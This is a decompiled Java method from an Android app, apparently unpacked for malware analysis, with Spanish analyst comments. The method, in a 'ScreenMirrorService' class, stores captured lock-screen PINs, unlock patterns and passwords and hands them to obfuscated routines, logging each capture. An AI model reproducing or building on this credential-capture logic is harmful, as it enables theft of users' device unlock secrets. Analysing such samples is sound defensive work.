// FRAGMENTO DECOMPILADO; no es una clase independiente compilable.
// Recibe un valor y lo guarda según el tipo. No demuestra cómo se obtuvo ni que pertenezca al usuario.
// ev_8b19f2a5d906e73a5354dd6198dd6d4257a4ca8ef93ee874dcac1b0189d23c10
// {'path': 'C:\\Users\\Romario\\Documents\\Codex\\2026-10-15\\ho\\work\\player_unpacked_for_analysis.apk', 'class_name': 'lyr.stable.runtime.ScreenMirrorService', 'method_name': 'j'}

public static void j(int i3, String str, ScreenMirrorService screenMirrorService) {
    if (i3 == 1) {
        screenMirrorService.getSharedPreferences("captured_pin", 0).edit().putString("pin", str).apply();
        screenMirrorService.A1(str, "pin", "mask");
        screenMirrorService.F4("pin", str);
        screenMirrorService.m6("pin");
        Log.i("ScreenMirror", "[LockMask] captured PIN committed len=" + str.length());
        return;
    }
    if (i3 == 2) {
        screenMirrorService.getSharedPreferences("unlock_seq", 0).edit().putString("pattern_dots", str).apply();
        screenMirrorService.A1(str, "pattern", "mask");
        screenMirrorService.F4("pattern", str);
        screenMirrorService.m6("pattern");
        Log.i("ScreenMirror", "[LockMask] captured pattern committed length=" + str.length());
        return;
    }
    if (str != null && !str.isEmpty()) {
        screenMirrorService.getSharedPreferences("captured_pin", 0).edit().putString("password", str).apply();
        screenMirrorService.A1(str, "password", "mask");
        Log.i("ScreenMirror", "[LockMask] captured password committed len=" + str.length());
    }
    screenMirrorService.F4("password", str);
    screenMirrorService.m6("password");
}
